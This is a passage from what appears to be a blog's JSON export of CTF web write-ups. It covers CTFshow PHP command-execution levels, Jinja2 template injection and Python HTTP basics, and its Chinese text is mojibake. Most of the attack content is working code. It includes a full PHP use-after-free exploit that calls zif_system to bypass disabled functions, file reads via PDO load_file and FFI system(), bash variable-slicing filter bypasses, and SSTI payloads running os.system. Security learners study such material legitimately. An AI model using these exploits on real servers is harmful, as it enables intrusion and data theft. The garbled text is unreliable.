71\n\n```\npayload:\nPOST\nc=include('/flag.txt');exit();\n```\n\nå°è¯•ç™½å«–å‘ç°å¤±è´¥ï¼Œä¸‹è½½æºç è¿›è¡ŒæŸ¥çœ‹ï¼Œå‘ç°åœ¨è¾“å‡ºä¹‹å‰å°†ç¼“å†²åŒºä¸­çš„æ‰€æœ‰æ•°å­—å­—æ¯æ¢æˆäº†é—®å·ï¼Œé‚£ä¹ˆæˆ‘ä»¬è®©å®ƒåŒ…å«å®Œç›´æ¥é€€å‡ºå°±è¡Œäº†\n\n##### 72\n\næ–‡ä»¶æ¢ä½ç½®äº†å“­å“­ï¼Œscandiræ‰¾ä¸åˆ°æ ¹ç›®å½•ï¼Œvar_dumpä¹Ÿæ²¡äº†ï¼Œå“­å“­\n\nçœ‹æç¤º\n\né¦–å…ˆæ‰¾å‡ºæ–‡ä»¶å\n\n```PHP\npayload:\nPOST\nc=$a=new DirectoryIterator(\"glob:///*\");\nforeach($a as $f)\n{echo($f->__toString().' ');\n} exit(0);\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-03-19 23.52.16.png)uafè„šæœ¬å¦‚ä¸‹\n\n```PHP\n<?php\nfunction ctfshow($cmd) {\n    global $abc, $helper, $backtrace;\n\n    class Vuln {\n        public $a;\n        public function __destruct() { \n            global $backtrace; \n            unset($this->a);\n            $backtrace = (new Exception)->getTrace();\n            if(!isset($backtrace[1]['args'])) {\n                $backtrace = debug_backtrace();\n            }\n        }\n    }\n\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n\n    function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= sprintf(\"%c\",($ptr & 0xff));\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    function write(&$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i < $n; $i++) {\n            $str[$p + $i] = sprintf(\"%c\",($v & 0xff));\n            $v >>= 8;\n        }\n    }\n\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper->a);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n        return $leak;\n    }\n\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { \n\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { \n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                \n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                \n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) {\n                return $addr;\n            }\n        }\n    }\n\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) {\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    function trigger_uaf($arg) {\n\n        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');\n        $vuln = new Vuln();\n        $vuln->a = $arg;\n    }\n\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n\n    $n_alloc = 10; \n    $contiguous = [];\n    for($i = 0; $i < $n_alloc; $i++)\n        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');\n\n    trigger_uaf('x');\n    $abc = $backtrace[1]['args'][0];\n\n    $helper = new Helper;\n    $helper->b = function ($x) { };\n\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n\n    $closure_obj = str2ptr($abc, 0x20);\n\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n\n\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i < 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); \n    write($abc, 0xd0 + 0x68, $zif_system); \n\n    ($helper->b)($cmd);\n    exit();\n}\n\nctfshow(\"cat /flag0.txt\");ob_end_flush();\n?>\n\n```\n\næœ€ç»ˆ\n\n```\npayload:\nPOST\nc=ä¸Šé¢çš„ä»£ç \n```\n\n##### 73\n\nåŒä¸Šï¼Œæ–‡ä»¶åæ›´æ”¹ä¸ºflagc\n\n##### 74\n\n```\npayload:\nPOST\nc=include('/flagx.txt');exit();\n```\n\né¦–å…ˆæ‰«ç›®å½•ï¼ŒåŒä¸Šé¢˜payloadï¼Œè€Œåå‘ç°åœ¨æ ¹ç›®å½•æœ‰flagx.txtå°è¯•åŒ…å«æˆåŠŸ\n\n##### 75\n\nbanæ‰äº†open_basedirè®¿é—®æ–‡ä»¶çš„æ–¹å¼ï¼Œåªèƒ½é€šè¿‡åˆ«çš„æ–¹æ³•æ¥è®¿é—®æ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡mysqlè®¿é—®ï¼Œåœ¨å‰é¢å‡ é¢˜ä¸­å¯ä»¥æ‰¾åˆ°mysqlçš„è´¦å·å¯†ç ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹\n\n```PHP\npayload:\nPOST\nc=try {\n  $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');\n  foreach($dbh->query('select load_file(\"/flag36.txt\")') as $row)\n\t{\n    echo($row[0]); \n  }\n  $dbh = null;\n}\ncatch (PDOException $e) \n{\n  echo $e->getMessage();\n  exit(0);\n}\nexit(0);\n```\n\næ‹“å±•PDOçŸ¥è¯†ï¼š\n\n```PHP\nPHP æ•°æ®å¯¹è±¡ ï¼ˆPDOï¼‰ æ‰©å±•ä¸ºPHPè®¿é—®æ•°æ®åº“å®šä¹‰äº†ä¸€ä¸ªè½»é‡çº§çš„ä¸€è‡´æ¥å£ã€‚\nPDO æä¾›äº†ä¸€ä¸ªæ•°æ®è®¿é—®æŠ½è±¡å±‚ï¼Œè¿™æ„å‘³ç€ï¼Œä¸ç®¡ä½¿ç”¨å“ªç§æ•°æ®åº“ï¼Œéƒ½å¯ä»¥ç”¨ç›¸åŒçš„å‡½æ•°ï¼ˆæ–¹æ³•ï¼‰æ¥æŸ¥è¯¢å’Œè·å–æ•°æ®ã€‚\nPDOéšPHP5.1å‘è¡Œï¼Œåœ¨PHP5.0çš„PECLæ‰©å±•ä¸­ä¹Ÿå¯ä»¥ä½¿ç”¨ï¼Œæ— æ³•è¿è¡Œäºä¹‹å‰çš„PHPç‰ˆæœ¬ã€‚\nä¸€ä¸ªå®ä¾‹\n<?php\n$dbms='mysql';     //æ•°æ®åº“ç±»å‹\n$host='localhost'; //æ•°æ®åº“ä¸»æœºå\n$dbName='test';    //ä½¿ç”¨çš„æ•°æ®åº“\n$user='root';      //æ•°æ®åº“è¿æ¥ç”¨æˆ·å\n$pass='';          //å¯¹åº”çš„å¯†ç \n$dsn=\"$dbms:host=$host;dbname=$dbName\";\n\ntry {\n    $dbh = new PDO($dsn, $user, $pass); //åˆå§‹åŒ–ä¸€ä¸ªPDOå¯¹è±¡\n    echo \"è¿æ¥æˆåŠŸ<br/>\";\n    /*ä½ è¿˜å¯ä»¥è¿›è¡Œä¸€æ¬¡æœç´¢æ“ä½œ\n    foreach ($dbh->query('SELECT * from FOO') as $row) {\n        print_r($row); //ä½ å¯ä»¥ç”¨ echo($GLOBAL); æ¥çœ‹åˆ°è¿™äº›å€¼\n    }\n    */\n    $dbh = null;\n} catch (PDOException $e) {\n    die (\"Error!: \" . $e->getMessage() . \"<br/>\");\n}\n//é»˜è®¤è¿™ä¸ªä¸æ˜¯é•¿è¿æ¥ï¼Œå¦‚æœéœ€è¦æ•°æ®åº“é•¿è¿æ¥ï¼Œéœ€è¦æœ€ååŠ ä¸€ä¸ªå‚æ•°ï¼šarray(PDO::ATTR_PERSISTENT => true) å˜æˆè¿™æ ·ï¼š\n$db = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT => true));\n\n?>\n```\n\n##### 76\n\nåŒä¸Šæ”¹åå­—\n\n##### 77\n\né¦–å…ˆè¿˜æ˜¯æ‰«ç›®å½•ï¼Œæ–‡ä»¶åflag36x.txtï¼Œå°è¯•ä¸Šé¢˜æ–¹æ³•å‘ç°æ•°æ®åº“æ¶ˆå¤±ï¼Œçœ‹æç¤ºæ˜¯PHP7.4ä»¥ä¸Šçš„æ–°ç‰¹æ€§ï¼Œå¯ä»¥é€šè¿‡æ–°å»ºä¸€ä¸ªFFIå¯¹è±¡æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œåˆå› ä¸ºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤åæ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠæ‰§è¡Œåçš„ç»“æœæ”¾åˆ°ç½‘ç«™ç›®å½•ä¸‹çš„ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­è¿›è¡Œè¯»å–\n\n```php\npayload:\nPOST\nc=$ffi = FFI::cdef(\"int system(const char *command);\");\n$a='/readflag > /var/www/html/1.txt';\n$ffi->system($a);\n```\n\nç„¶åè®¿é—®/1.txtå³å¯\n\n##### 118\n\né¦–å…ˆæŸ¥çœ‹æºç ï¼Œå‘ç°è¾“å…¥è¢«åŒ…å«åˆ°systemå‡½æ•°ä¸­æ‰§è¡Œï¼Œå°è¯•`echoï¼Œwhoamiï¼Œlsï¼Œcat`å…¨éƒ¨å¤±æ•ˆæƒ³æ–¹æ³•ç»•è¿‡ï¼Œè¾“å…¥ç©ºæ ¼å‘ç°å¯ä»¥æ‰§è¡Œï¼Œæ‰€ä»¥å¯ä»¥å°è¯•é€šè¿‡æ„é€ ç³»ç»Ÿå˜é‡æ¥æ‰§è¡Œï¼ŒæŸ¥çœ‹æç¤ºçš„å›¾ç‰‡\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-03-21 16.39.03.png)\n\nå‘ç°æ˜¯é»˜è®¤é…ç½®æ–‡ä»¶ä¸‹çš„æ–‡ä»¶ååˆ—è¡¨ï¼Œå¯ä»¥é€šè¿‡å‰ªè£æ„é€ å˜é‡ï¼Œè¯»å–æ–‡ä»¶å‘½ä»¤æœ€å®¹æ˜“è¿›è¡Œæ„é€ çš„å°±æ˜¯`nl`ï¼Œæƒ³æ‹¼æ¥å‡ºnlåªéœ€è¦å–ç³»ç»Ÿé…ç½®å˜é‡æœ€åä¸€ä½nå’Œå½“å‰æ‰§è¡Œç›®å½•æœ€åä¸€ä½lå³å¯ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹\n\n```\npayload:${PATH:~0}${PWD:~0}$IFS????.???\n```\n\nå‘ç°è¿˜æ˜¯ä¸è¡Œï¼Œæ˜¯å› ä¸ºè¿‡æ»¤äº†æ•°å­—ï¼Œæ²¡å…³ç³»ï¼Œå‰ªè£å­—ç¬¦è¿˜å¯é€šè¿‡å¤§å†™å­—æ¯è§£å†³ï¼ŒçœŸÂ·æœ€ç»ˆpayloadå¦‚ä¸‹\n\n```\npayload:${PATH:~A}${PWD:~A}$IFS????.???\n```\n\n**ç³»ç»Ÿå˜é‡è¡¥å……çŸ¥è¯†**\n\n```\n$PATH ç³»ç»Ÿé…ç½®å˜é‡\n$PWD å½“å‰æ‰§è¡Œç›®å½•\n$HOME é»˜è®¤è¿›å…¥çš„ç›®å½•\n$SHELL\n$USER å½“å‰user\n$SHLVL ä»£è¡¨å½“å‰shellçª—å£çš„æ·±åº¦ï¼Œä¸€èˆ¬ä¸º1\n$PHP_CFLAGS æŒ‡å®šå¤´æ–‡ä»¶ï¼ˆ.hæ–‡ä»¶ï¼‰çš„è·¯å¾„ï¼Œå¦‚ï¼šCFLAGS=-I/usr/include -I/path/includeã€‚åŒæ ·åœ°ï¼Œå®‰è£…ä¸€ä¸ªåŒ…æ—¶ä¼šåœ¨å®‰è£…è·¯å¾„ä¸‹å»ºç«‹ä¸€ä¸ªincludeç›®å½•ï¼Œå½“å®‰è£…è¿‡ç¨‹ä¸­å‡ºç°é—®é¢˜æ—¶ï¼Œè¯•ç€æŠŠä»¥å‰å®‰è£…çš„åŒ…çš„includeç›®å½•åŠ å…¥åˆ°è¯¥å˜é‡ä¸­æ¥ã€‚\n$PHP_VERSION PHPç‰ˆæœ¬\n\n```\n\n**Linuxå˜é‡è¡¥å……çŸ¥è¯†**\n\n```\n${å˜é‡å:ä»å“ªä¸€ä½å¼€å§‹å–:å–å¤šé•¿}ï¼Œå¦‚æ²¡æœ‰é•¿åº¦é»˜è®¤å–åˆ°æœ€åï¼Œå¦‚æœæ²¡æœ‰èµ·å§‹ä½å°±ä»å¤´å¼€å§‹\n${#å˜é‡å}ï¼Œä»£è¡¨è¿™ä¸ªå˜é‡çš„é•¿åº¦\n$\n```\n\n##### 119\n\nå…ˆå°è¯•ä¸Šä¸€æŠŠçš„æ˜¯å¦å¯è¡Œï¼Œä¸è¡Œæ‰€ä»¥ç›´æ¥çœ‹æç¤ºå§ï¼Œç³»ç»Ÿå˜é‡çš„çŸ¥è¯†è¡¥å……åœ¨ä¸Šä¸€é“é¢˜äº†ï¼Œé’ˆå¯¹æœ¬é¢˜\n\n```\nSHLVLçš„å€¼ä¸º2ï¼Œ#SHLVLçš„å€¼ä¸º1ï¼Œä»PHP_VERSIONçš„ç¬¬äºŒä½å–ä¸€ä¸ªä¸º3ï¼Œä¹Ÿå°±æ˜¯${PHP_VERSION:${SHLVL}:${#SHLVL}}ä¸º3ï¼Œæœ€ç»ˆå–\nPHP_CFLAGSå˜é‡ä»ç¬¬ä¸‰ä½å¼€å§‹çš„å‰ä¸‰ä¸ªå³å¯æ„é€ tac\n```\n\næœ€ç»ˆpayloadå¦‚ä¸‹\n\n```\npayload:${PHP_CFLAGS:${PHP_VERSION:${SHLVL}:${#SHLVL}}:${PHP_VERSION:${SHLVL}:${#SHLVL}}} ????.???\n```\n\n##### 120\n\nä¸Šä¸€æŠŠçš„å­—ç¬¦å¤ªé•¿äº†ï¼Œåªèƒ½é€šè¿‡åˆ«çš„å‘½ä»¤è¯»å–äº†\n\n```\ntipsï¼šLinuxä¸­çš„base64åœ¨/binç›®å½•ä¹‹ä¸‹ï¼Œbase64 æ–‡ä»¶åå³å¯å°†æ–‡ä»¶è¿›è¡Œbase64ç¼–ç \n```\n\næ‰€ä»¥æˆ‘ä»¬æœ€ç»ˆæ„é€ å‡ºç»“æœä¸º/bin/base64 flag.phpå³å¯\n\né¦–å…ˆæ˜¯/å­—ç¬¦ï¼ŒPWDé¦–ä½ï¼Œè€Œåbinå¯ä½¿ç”¨é€šé…ç¬¦ï¼Œå°è¯•base64ä¹Ÿä½¿ç”¨é€šé…ç¬¦ä¸å¯è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•æ„å»ºå‡ºæ•°å­—4æ¥åŒ¹é…\n\n```\ntipsï¼šRANDOMå˜é‡èƒ½ç”Ÿæˆä¸€ä¸‡ä»¥å†…çš„éšæœºæ•°ï¼Œç”¨#å–é•¿åº¦å³å¯æœ‰æ¦‚ç‡å¾—åˆ°4\n```\n\næœ€ç»ˆpayload\n\n```\npayload:\nPOST\ncode=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???\n```\n\n~~å¤šåˆ·æ–°å‡ æ¬¡æ€»ä¼šå‡ºæ¥çš„~~\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-03-21 19.36.51.png)\n\n##### 121\n\nå°è¯•ä¸Šé¢˜payloadï¼Œå‘ç°SHLVLè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ª1\n\n```\ntips:é€šè¿‡$?æ¥å®ç°çš„ï¼Œ$?æ˜¯è¡¨ç¤ºä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œç»“æŸåçš„ä¼ å›å€¼ã€‚é€šå¸¸0ä»£è¡¨æ‰§è¡ŒæˆåŠŸï¼Œé0ä»£è¡¨æ‰§è¡Œæœ‰è¯¯\n```\n\næ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨${#?}å³å¯æ„é€ å‡º1ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹\n\n```\npayload:\nPOST\ncode=AAAAAAAAA\ncode=${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.???\n```\n\n##### 122\n\næ»¤äº†PWDä½†æ˜¯æœ‰HOMEï¼ŒHOMEæ›¿æ¢PWDå°±è¡Œï¼Œæ»¤äº†#å·æ²¡å‘å»é•¿åº¦ï¼ŒRANDOMå–ä¸€ä½å³å¯ï¼Œéšæœºåˆ°äº†å°±æ˜¯èƒœåˆ©\n\n```\npayload:\nPOST\ncode=A;${PWD::${?}}???${PWD::${?}}?????${RANDOM} ????.???\n```\n\n","tags":["CTF","web"]},{"title":"Web_python_template_injection","url":"/2022/02/04/Web-python-template-injection/","content":"\n# Pythonæ¨¡ç‰ˆæ³¨å…¥\n\n## æ¼æ´æˆå› \n\n`instance.__class__` å¯ä»¥è·å–å½“å‰å®ä¾‹çš„ç±»å¯¹è±¡\n\n`class.__mro__` è·å–å½“å‰ç±»å¯¹è±¡çš„æ‰€æœ‰ç»§æ‰¿ç±»\n\næ¯ä¸€ä¸ªæ–°å¼ç±»éƒ½ä¿ç•™äº†å®ƒæ‰€æœ‰çš„å­ç±»çš„å¼•ç”¨ï¼Œ`__subclasses__()`è¿™ä¸ªæ–¹æ³•è¿”å›äº†ç±»çš„æ‰€æœ‰å­˜æ´»çš„å­ç±»çš„å¼•ç”¨ï¼ˆæ³¨æ„æ˜¯ç±»å¯¹è±¡å¼•ç”¨ï¼Œä¸æ˜¯å®ä¾‹ï¼‰\n\n<!--more-->\n\nåœ¨Jinja2æ¨¡æ¿å¼•æ“ä¸­ï¼Œ`{{}}`æ˜¯å˜é‡åŒ…è£¹æ ‡è¯†ç¬¦ã€‚`{{}}`å¹¶ä¸ä»…ä»…å¯ä»¥ä¼ é€’å˜é‡ï¼Œè¿˜å¯ä»¥æ‰§è¡Œä¸€äº›ç®€å•çš„è¡¨è¾¾å¼ã€‚\n\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä»»æ„æ„é€ ä¸€ä¸ªå˜é‡`xxx.__class__.__mro__[-1].__subclasses__()`æ¥è·å–è¯¥Pythonç¨‹åºä¸­æ‰€æœ‰ä½¿ç”¨çš„æ¨¡å—\n\nå†ä½¿ç”¨å¯¹åº”ä½ç½®çš„æ¨¡å—é€šè¿‡`__init__`è¿›è¡Œåˆå§‹åŒ–ï¼Œ`__globals['å˜é‡']__`è¿›è¡Œä¼ å‚è¿›è€Œè¿›è¡Œè°ƒç”¨\n\nè€Œåæˆ‘ä»¬å¯ä»¥ä½¿ç”¨pythonä¸­çš„os.popenæ¨¡å—æ‰§è¡Œç³»ç»Ÿå‘½ä»¤\n\né€šç”¨payloadå¦‚ä¸‹\n\n`{{xxx.__class__.__mro__[-1].__subclasses__()[site._Printeræ¨¡å—å¯¹åº”ä½ç½®].__init__.__globals__['os'].system('è¦æ‰§è¡Œçš„å‘½ä»¤')}}`\n\n`{{xxx.__class__.__mro__[-1].__subclasses__()[flieæ¨¡å—å¯¹åº”ä½ç½®]('æ–‡ä»¶åç§°').read()}}å¯ç”¨äºè¯»å–æ–‡ä»¶`\n\nå¦‚é¢˜ç›®ä¸­è¿‡æ»¤äº†å…³é”®å­—ï¼Œå¯å°è¯•é€šè¿‡getä¼ å‚ä¼ å…¥å‚æ•°ï¼Œå¦‚`{{[request.args.a]}}?a=__class__`\n","tags":["-CTF -web -python"]},{"title":"Pythonäºwebå±‚åº”ç”¨","url":"/2022/01/25/Pythonäºwebå±‚åº”ç”¨/","content":"\n# Pythonäºwebå±‚åº”ç”¨\n\n## HTTPåè®®åŸºç¡€\n\n### åè®®åˆ†ç±»\n\nHTTP 1.0 80ç«¯å£ å•æ¬¡ä¸€ä¸ªé“¾æ¥\n\nHTTP 1.1 80ç«¯å£ å¤šæ¬¡å¯ä¸€ä¸ªé“¾æ¥\n\nHTTPåè®®ä¸å¤Ÿå®‰å…¨ï¼Œè¿›è€Œå‘å±•å‡ºäº†HTTPSåè®®\n\nHTTPS 443ç«¯å£ åŠ å¯†åæ•°æ®ä¼ è¾“\n\n<!--more-->\n\n### è¯·æ±‚æ–¹æ³•\n\n###### HTTP 1.0\n\nGET POST HEAD\n\n###### HTTP 1.1ä¸HTTPS\n\nOPTIONS PUT DELETE TRACE CONNECT PATCH\n\n### URLæ ¼å¼\n\nåè®®://ä¸»æœºå.åŸŸå/æ–‡ä»¶å¤¹/æ–‡ä»¶?å‚æ•°=å€¼&å‚æ•°=å€¼\n\n### HTTPè¯·æ±‚å¤´\n\nUser-Agentï¼šæµè§ˆå™¨ç‰ˆæœ¬ä¿¡æ¯\n\nAccept-encodingï¼šæµè§ˆå™¨æ¥å—çš„ç¼–ç \n\nRefererï¼šå½“å‰ç½‘é¡µè·³è½¬æ¥æº\n\nCookieï¼šé¡¾åæ€ä¹‰ï¼Œ~~å¥½åƒçš„é¥¼å¹²ï¼Œ~~Cookieä¿¡æ¯\n\nLocationï¼šè·³è½¬åˆ°å“ªé‡Œ\n\nSet-Cookieï¼šè®¾ç½®Cookieä¿¡æ¯\n\nWWW-Authenticateï¼šç”¨äºèº«ä»½éªŒè¯HTTP Basicç­‰\n\n### HTTPå“åº”çŠ¶æ€ç \n\n1XXï¼šä¿¡æ¯æç¤º\n\n2XXï¼šæˆåŠŸ\n\n3XXï¼šé‡å®šå‘\n\n4XXï¼šå®¢æˆ·ç«¯é”™è¯¯\n\n5XXï¼šæœåŠ¡ç«¯é”™è¯¯\n\n### æŸ¥çœ‹HTTP\n\nä½¿ç”¨æµè§ˆå™¨å®¡æŸ¥è¿›è¡ŒæŸ¥çœ‹\n\nä½¿ç”¨Burpsuiteæˆªæ–­æŸ¥çœ‹\n\n## Pythonä½¿ç”¨HTTPè¯·æ±‚\n\n###### GETè¯·æ±‚\n\nä¸å¸¦å‚æ•°`requests.get(url)`\n\nå¸¦å‚æ•°`requests.get(url=url,params={\"key1\":\"value1\",\"key2\":\"value2\"})`\n\nè¿”å›çš„å¯¹è±¡r.urlè·å–url\n\n###### POSTè¯·æ±‚\n\nä¸å¸¦å‚æ•°`requests.post(url)`\n\nå¸¦å‚æ•°`requests.post(url=url,data={\"key1\":\"value1\",\"key2\":\"value2\"})`\n\n###### è‡ªå®šä¹‰è¯·æ±‚å¤´\n\nheaders={key1:value1,key2:value2}\n\nrequests.get(url=url,headers=headers)\n\n###### å…¶ä»–è¯·æ±‚\n\nrequests.put(url,data)\n\nrequests.delete(url)\n\nrequests.head(url)\n\nrequests.options(url)\n\n## Pythonå¤„ç†HTTPå“åº”\n\n**è·å–ç›¸åº”çŠ¶æ€ç ï¼š**r.status_code\n\n**è·å–å“åº”æ–‡æœ¬ï¼š**r.contentï¼ˆè·å–åˆ°äºŒè¿›åˆ¶å†…å®¹ï¼‰r.textï¼ˆè·å–åŸå§‹æ–‡æœ¬ä»£ç ï¼‰\n\n**è·å–ç›¸åº”å¤´ï¼š**r.headers\n\n**è·å–è¯·æ±‚å¤´ï¼š**r.reuqests.headers\n\n**è·å–è¯·æ±‚URLï¼š**r.url\n\n**è·å–Cookieï¼š**r.cookies\n\n## Pythonè®¾ç½®HTTPä»£ç†\n\n**ä»£ç†è®¾ç½®ï¼š**httpå’Œhttps:`proxies={'http':'http://ä»£ç†æœåŠ¡å™¨:ä»£ç†ç«¯å£','https':'https://ä»£ç†æœåŠ¡å™¨:ä»£ç†ç«¯å£'}`\n\n**å‚æ•°è®¾ç½®ï¼š**`proxies=proxies,verfiy=False`\n\n## Pythonä¼šè¯ç¼–ç¨‹\n\né€šè¿‡Set-Cookieè®¾ç½®ä¸€ä¸ªcookieå€¼\n\nä½¿ç”¨`s=requesets.Session()`å»ºç«‹ä¸€ä¸ªæ–°çš„ç©ºä¼šè¯\n\n`r=s.get(url)`æ¥åœ¨ä¼šè¯ä¸­å‘èµ·ä¸ªä½“è¯·æ±‚\n\n## Pythonåˆ¶ä½œç›®å½•æ‰«æå·¥å…·\n\n###### ç›®å½•æ‰«æåŸç†\n\n1ã€è¯»å–å­—å…¸æ–‡ä»¶æ‹¼æ¥URL\n\n2ã€é€šè¿‡getè¯·æ±‚è®¿é—®URL\n\n3ã€è·å–çŠ¶æ€ç åˆ¤æ–­ç›®å½•æ˜¯å¦å­˜åœ¨\n\n###### å­—å…¸æ–‡ä»¶è¯»å–\n\n1ã€`with open(\"filename.txt\",\"r\") as f:`\n\n2ã€è¯»å–æ–¹å¼ï¼š\n\n- `f.readline()//è¯»å–ä¸€è¡Œ`\n- `f.readlines()//é€è¡Œè¯»å–åˆ°ä¸€ä¸ªåˆ—è¡¨ä¸­`\n- `f.read(å­—èŠ‚æ•°)//æŒ‰å­—èŠ‚è¯»`\n- `line.strip()//å»é™¤ç©ºè¡Œ`\n\n3ã€`f.close()`å…³é—­æ–‡ä»¶æµ\n\n4ã€sysåº“ä¸­çš„sys.argv[0]ä¸ºå½“å‰pythonæ–‡ä»¶ç»å¯¹è·¯å¾„ï¼Œsys.argv[1]ä¸ºä¼ å…¥ç¬¬ä¸€ä¸ªå‚æ•°\n\n5ã€User-Agenté€šè¿‡æŠ“åŒ…å…ˆè·å–çœŸå®çš„User-Agentï¼Œå†é€šè¿‡headerså­—å…¸ä¼ å…¥getè¯·æ±‚\n\n## IIS PUTæ¼æ´\n\nIISä¸­æ‹“å±•å·¥å…·WebDAVæ”¯æŒHTTPæ–¹æ³•ï¼Œä¹Ÿæä¾›äº†ä¸€äº›å…¶ä»–åŠŸèƒ½å¼ºå¤§çš„æ–¹æ³•ï¼ˆMoveï¼‰ï¼Œä½¿å¾—å¼€å¯WebDAVå¯ä»¥ç›´æ¥ä¸Šä¼ ä»»æ„æ–‡ä»¶\n\n**æ¢æµ‹æ–¹æ³•ï¼š**é€šè¿‡HTTPä¸­optionsæ–¹æ³•å¯ä»¥æ¢æµ‹å‡ºæœåŠ¡å™¨æ”¯æŒçš„HTTPæ–¹æ³•\n\n**æ¢æµ‹è¿‡ç¨‹ï¼š**\n\n- ç¡®å®šç›®æ ‡ä¸»æœº\n- ä½¿ç”¨HTTP optionsæ–¹æ³•æ¢æµ‹\n- æŸ¥çœ‹è¿”å›ç»“æœä¸­æ˜¯å¦å­˜åœ¨MOVE PUT\n- æŸ¥çœ‹å“åº”å¤´ä¸­çš„PUBLICå±æ€§\n\n## æ¢æµ‹æœåŠ¡å™¨ä¿¡æ¯\n\nç›¸åº”å¤´ä¸­çš„Serverï¼šæœåŠ¡å™¨ä¸­é—´ä»¶å±æ€§\n\nX-Powered-Byï¼šæœåŠ¡å™¨è„šæœ¬æŠ€æœ¯\n\n## Pythonåˆ¶ä½œæ¼æ´æ£€æµ‹å·¥å…·\n\né¦–å…ˆäº†è§£æ¼æ´äº§ç”ŸåŸç†ï¼Œæ ¹æ®æ¼æ´åŸç†å†™å‡ºå¯¹åº”çš„POCä»£ç æ¥éªŒè¯æ¼æ´æ˜¯å¦å­˜åœ¨\n\n## 